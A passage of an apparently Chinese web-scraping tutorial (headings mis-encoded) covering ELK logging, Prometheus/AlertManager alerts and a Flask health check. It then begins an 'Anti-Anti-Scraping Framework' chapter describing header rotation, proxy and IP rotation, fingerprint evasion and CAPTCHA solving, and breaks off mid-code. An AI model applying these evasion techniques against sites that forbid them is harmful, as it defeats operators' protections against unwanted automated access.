<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">xpack.security.enabled=false</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;9200:9200&quot;</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">es_data:/usr/share/elasticsearch/data</span>

<span class="w">  </span><span class="nt">logstash</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">logstash:8.11.0</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;5044:5044&quot;</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./logstash.conf:/usr/share/logstash/pipeline/logstash.conf</span>

<span class="w">  </span><span class="nt">kibana</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">kibana:8.11.0</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;5601:5601&quot;</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ELASTICSEARCH_HOSTS=http://elasticsearch:9200</span>

<span class="w">  </span><span class="nt">filebeat</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">elastic.co/beats/filebeat:8.11.0</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./filebeat.yml:/usr/share/filebeat/filebeat.yml</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/var/log:/var/log:ro</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/var/lib/docker/containers:/var/lib/docker/containers:ro</span>

<span class="nt">volumes</span><span class="p">:</span>
<span class="w">  </span><span class="nt">es_data</span><span class="p">:</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å‘Šè­¦é…ç½®">å‘Šè­¦é…ç½®</h2>

      <h3 id="alertmanager-é…ç½®">AlertManager é…ç½®</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># alertmanager.yml</span>
<span class="nt">global</span><span class="p">:</span>
<span class="w">  </span><span class="nt">resolve_timeout</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5m</span>

<span class="nt">route</span><span class="p">:</span>
<span class="w">  </span><span class="nt">group_by</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&#39;alertname&#39;</span><span class="p p-Indicator">]</span>
<span class="w">  </span><span class="nt">group_wait</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">10s</span>
<span class="w">  </span><span class="nt">group_interval</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">10s</span>
<span class="w">  </span><span class="nt">repeat_interval</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1h</span>
<span class="w">  </span><span class="nt">receiver</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;email&#39;</span>

<span class="nt">receivers</span><span class="p">:</span>
<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;email&#39;</span>
<span class="w">    </span><span class="nt">email_configs</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">to</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;admin@example.com&#39;</span>
<span class="w">        </span><span class="nt">from</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;alertmanager@example.com&#39;</span>
<span class="w">        </span><span class="nt">smarthost</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;smtp.example.com:587&#39;</span>
<span class="w">        </span><span class="nt">auth_username</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;alertmanager@example.com&#39;</span>
<span class="w">        </span><span class="nt">auth_password</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;password&#39;</span>

<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;slack&#39;</span>
<span class="w">    </span><span class="nt">slack_configs</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">api_url</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;https://hooks.slack.com/services/xxx&#39;</span>
<span class="w">        </span><span class="nt">channel</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;#alerts&#39;</span>
<span class="w">        </span><span class="nt">title</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;Scraper</span><span class="nv"> </span><span class="s">Alert&#39;</span>
</code></pre>
      </div>

      <h3 id="prometheus-å‘Šè­¦è§„åˆ™">Prometheus å‘Šè­¦è§„åˆ™</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># alerts.yml</span>
<span class="nt">groups</span><span class="p">:</span>
<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_alerts</span>
<span class="w">    </span><span class="nt">interval</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">30s</span>
<span class="w">    </span><span class="nt">rules</span><span class="p">:</span>
<span class="w">      </span><span class="c1"># æˆåŠŸç‡å‘Šè­¦</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">alert</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">LowSuccessRate</span>
<span class="w">        </span><span class="nt">expr</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_success_rate &lt; 0.8</span>
<span class="w">        </span><span class="nt">for</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5m</span>
<span class="w">        </span><span class="nt">labels</span><span class="p">:</span>
<span class="w">          </span><span class="nt">severity</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">warning</span>
<span class="w">        </span><span class="nt">annotations</span><span class="p">:</span>
<span class="w">          </span><span class="nt">summary</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Success</span><span class="nv"> </span><span class="s">rate</span><span class="nv"> </span><span class="s">is</span><span class="nv"> </span><span class="s">low&quot;</span>
<span class="w">          </span><span class="nt">description</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Success</span><span class="nv"> </span><span class="s">rate</span><span class="nv"> </span><span class="s">is</span><span class="nv"> </span><span class="s">{{</span><span class="nv"> </span><span class="s">$value</span><span class="nv"> </span><span class="s">}}&quot;</span>

<span class="w">      </span><span class="c1"># é˜Ÿåˆ—å †ç§¯å‘Šè­¦</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">alert</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">QueueBacklog</span>
<span class="w">        </span><span class="nt">expr</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_queue_size &gt; 10000</span>
<span class="w">        </span><span class="nt">for</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">10m</span>
<span class="w">        </span><span class="nt">labels</span><span class="p">:</span>
<span class="w">          </span><span class="nt">severity</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">warning</span>
<span class="w">        </span><span class="nt">annotations</span><span class="p">:</span>
<span class="w">          </span><span class="nt">summary</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Queue</span><span class="nv"> </span><span class="s">is</span><span class="nv"> </span><span class="s">backing</span><span class="nv"> </span><span class="s">up&quot;</span>
<span class="w">          </span><span class="nt">description</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Queue</span><span class="nv"> </span><span class="s">size:</span><span class="nv"> </span><span class="s">{{</span><span class="nv"> </span><span class="s">$value</span><span class="nv"> </span><span class="s">}}&quot;</span>

<span class="w">      </span><span class="c1"># é«˜é”™è¯¯ç‡å‘Šè­¦</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">alert</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">HighErrorRate</span>
<span class="w">        </span><span class="nt">expr</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">rate(scraper_errors_total[5m]) &gt; 10</span>
<span class="w">        </span><span class="nt">for</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5m</span>
<span class="w">        </span><span class="nt">labels</span><span class="p">:</span>
<span class="w">          </span><span class="nt">severity</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">critical</span>
<span class="w">        </span><span class="nt">annotations</span><span class="p">:</span>
<span class="w">          </span><span class="nt">summary</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;High</span><span class="nv"> </span><span class="s">error</span><span class="nv"> </span><span class="s">rate</span><span class="nv"> </span><span class="s">detected&quot;</span>
<span class="w">          </span><span class="nt">description</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Error</span><span class="nv"> </span><span class="s">rate:</span><span class="nv"> </span><span class="s">{{</span><span class="nv"> </span><span class="s">$value</span><span class="nv"> </span><span class="s">}}</span><span class="nv"> </span><span class="s">errors/s&quot;</span>

<span class="w">      </span><span class="c1"># Worker å®•æœºå‘Šè­¦</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">alert</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">WorkerDown</span>
<span class="w">        </span><span class="nt">expr</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_active_workers == 0</span>
<span class="w">        </span><span class="nt">for</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1m</span>
<span class="w">        </span><span class="nt">labels</span><span class="p">:</span>
<span class="w">          </span><span class="nt">severity</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">critical</span>
<span class="w">        </span><span class="nt">annotations</span><span class="p">:</span>
<span class="w">          </span><span class="nt">summary</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;No</span><span class="nv"> </span><span class="s">active</span><span class="nv"> </span><span class="s">workers&quot;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å¥åº·æ£€æŸ¥">å¥åº·æ£€æŸ¥</h2>

      <h3 id="http-å¥åº·æ£€æŸ¥ç«¯ç‚¹">HTTP å¥åº·æ£€æŸ¥ç«¯ç‚¹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">jsonify</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">redis</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">()</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/health&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">health</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;å¥åº·æ£€æŸ¥&quot;&quot;&quot;</span>
    <span class="n">checks</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;redis&#39;</span><span class="p">:</span> <span class="n">check_redis</span><span class="p">(),</span>
        <span class="s1">&#39;queue&#39;</span><span class="p">:</span> <span class="n">check_queue</span><span class="p">(),</span>
        <span class="s1">&#39;workers&#39;</span><span class="p">:</span> <span class="n">check_workers</span><span class="p">()</span>
    <span class="p">}</span>

    <span class="n">all_healthy</span> <span class="o">=</span> <span class="nb">all</span><span class="p">(</span><span class="n">checks</span><span class="o">.</span><span class="n">values</span><span class="p">())</span>
    <span class="n">status_code</span> <span class="o">=</span> <span class="mi">200</span> <span class="k">if</span> <span class="n">all_healthy</span> <span class="k">else</span> <span class="mi">503</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span>
        <span class="s1">&#39;status&#39;</span><span class="p">:</span> <span class="s1">&#39;healthy&#39;</span> <span class="k">if</span> <span class="n">all_healthy</span> <span class="k">else</span> <span class="s1">&#39;unhealthy&#39;</span><span class="p">,</span>
        <span class="s1">&#39;checks&#39;</span><span class="p">:</span> <span class="n">checks</span>
    <span class="p">}),</span> <span class="n">status_code</span>

<span class="k">def</span><span class="w"> </span><span class="nf">check_redis</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;æ£€æŸ¥ Redis è¿æ¥&quot;&quot;&quot;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">r</span><span class="o">.</span><span class="n">ping</span><span class="p">()</span>
        <span class="k">return</span> <span class="kc">True</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="kc">False</span>

<span class="k">def</span><span class="w"> </span><span class="nf">check_queue</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;æ£€æŸ¥é˜Ÿåˆ—çŠ¶æ€&quot;&quot;&quot;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">size</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">llen</span><span class="p">(</span><span class="s1">&#39;urls&#39;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="mi">50000</span>  <span class="c1"># é˜Ÿåˆ—æœªè¿‡è½½</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="kc">False</span>

<span class="k">def</span><span class="w"> </span><span class="nf">check_workers</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;æ£€æŸ¥ Worker çŠ¶æ€&quot;&quot;&quot;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">active</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;active_workers&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">active</span> <span class="o">&gt;</span> <span class="mi">0</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="kc">False</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8080</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#06-Engineering-distributed-scraping">åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„</a></li>
        <li><a href="#06-Engineering-docker-deployment">Docker å®¹å™¨åŒ–éƒ¨ç½²</a></li>
        <li><a href="#06-Engineering-proxy-pool-management">ä»£ç†æ± ç®¡ç†</a></li>
      </ul>

    </div>

    <div class="section" id="06-Engineering-anti-anti-scraping-framework">
      <h2>57. Anti-Anti-Scraping Framework</h2>
      <h1 id="åçˆ¬è™«å¯¹æŠ—æ¡†æ¶">åçˆ¬è™«å¯¹æŠ—æ¡†æ¶</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>åçˆ¬è™«å¯¹æŠ—æ¡†æ¶æ˜¯ä¸€ä¸ªç»¼åˆæ€§çš„ç³»ç»Ÿï¼Œé›†æˆäº†å¤šç§å¯¹æŠ—æŠ€æœ¯ï¼Œç”¨äºçªç ´å„ç±»åçˆ¬è™«é˜²æŠ¤ã€‚æœ¬ç« ä»‹ç»å¦‚ä½•è®¾è®¡ä¸€ä¸ªé€šç”¨çš„åçˆ¬è™«å¯¹æŠ—æ¡†æ¶ã€‚</p>

      <hr />

      <h2 id="æ¡†æ¶æ¶æ„">æ¡†æ¶æ¶æ„</h2>

      <pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           Scraper Application              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      Anti-Anti-Scraping Framework          â”‚
â”‚                                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚      Request Middleware              â”‚ â”‚
â”‚  â”‚  - User-Agent Rotation               â”‚ â”‚
â”‚  â”‚  - Header Randomization              â”‚ â”‚
â”‚  â”‚  - Cookie Management                 â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚      Proxy Manager                   â”‚ â”‚
â”‚  â”‚  - Proxy Pool                        â”‚ â”‚
â”‚  â”‚  - IP Rotation                       â”‚ â”‚
â”‚  â”‚  - Proxy Health Check                â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚      Browser Simulator               â”‚ â”‚
â”‚  â”‚  - Puppeteer/Playwright              â”‚ â”‚
â”‚  â”‚  - Fingerprint Evasion               â”‚ â”‚
â”‚  â”‚  - Human Behavior Simulation         â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚      CAPTCHA Solver                  â”‚ â”‚
â”‚  â”‚  - 2Captcha Integration              â”‚ â”‚
â”‚  â”‚  - OCR Recognition                   â”‚ â”‚
â”‚  â”‚  - AI Model Prediction               â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚      Rate Limiter                    â”‚ â”‚
â”‚  â”‚  - Adaptive Delay                    â”‚ â”‚
â”‚  â”‚  - Token Bucket                      â”‚ â”‚
â”‚  â”‚  - Request Scheduling                â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚      Retry &amp; Fallback                â”‚ â”‚
â”‚  â”‚  - Exponential Backoff               â”‚ â”‚
â”‚  â”‚  - Fallback Strategies               â”‚ â”‚
â”‚  â”‚  - Error Recovery                    â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>

      <hr />

      <h2 id="æ ¸å¿ƒç»„ä»¶å®ç°">æ ¸å¿ƒç»„ä»¶å®ç°</h2>

      <h3 id="1-request-middleware">1. Request Middleware</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">Dict</span><span class="p">,</span> <span class="n">List</span>

<span class="k">class</span><span class="w"> </span><span class="nc">RequestMiddleware</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">user_agents</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_load_user_agents</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">headers_pool</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_load_headers</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">_load_user_agents</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;åŠ è½½ User-Agent æ± &quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="p">[</span>
            <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36&#39;</span><span class="p">,</span>
        <span class="p">]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">_load_headers</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="n">Dict</span><span class="p">]:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;åŠ è½½è¯·æ±‚å¤´æ± &quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="p">[</span>
            <span class="p">{</span>
                <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;text/html,application/xhtml+xml,application/xml;q=0.9&#39;</span><span class="p">,</span>
                <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.9,en;q=0.8&#39;</span><span class="p">,</span>
                <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate, br&#39;</span><span class="p">,</span>
                <span class="s1">&#39;Connection&#39;</span><span class="p">:</span> <span class="s1">&#39;keep-alive&#39;</span><span class="p">,</span>
                <span class="s1">&#39;Upgrade-Insecure-Requests&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span>
            <span class="p">},</span>
            <span class="c1"># æ›´å¤šå˜ä½“...</span>
        <span class="p">]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_random_headers</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">referer</span><span class="o">=</span><span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Dict</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–éšæœºè¯·æ±‚å¤´&quot;&quot;&quot;</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">headers_pool</span><span class="p">)</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span>
        <span class="n">headers</span><span class="p">[</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">user_agents</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">referer</span><span class="p">:</span>
            <span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Referer&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">referer</span>

        <span class="k">return</span> <span class="n">headers</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">randomize_headers</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">headers</span><span class="p">:</span> <span class="n">Dict</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Dict</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;éšæœºåŒ–è¯·æ±‚å¤´é¡ºåº&quot;&quot;&quot;</span>
        <span class="n">items</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">headers</span><span class="o">.</span><span class="n">items</span><span class="p">())</span>
        <span class="n">random</span><span class="o">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">items</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">dict</span><span class="p">(</span><span class="n">items</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="2-proxy-manager">2. Proxy Manager</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">redis</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">Optional</span>

<span class="k">class</span><span class="w"> </span><span class="nc">ProxyManager</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">redis_url</span><span class="o">=</span><span class="s1">&#39;redis://localhost:6379&#39;</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">from_url</span><span class="p">(</span><span class="n">redis_url</span><span class="p">,</span> <span class="n">decode_responses</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">test_url</span> <span class="o">=</span> <span class="s1">&#39;http://httpbin.org/ip&#39;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_proxy</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–å¯ç”¨ä»£ç†&quot;&quot;&quot;</span>
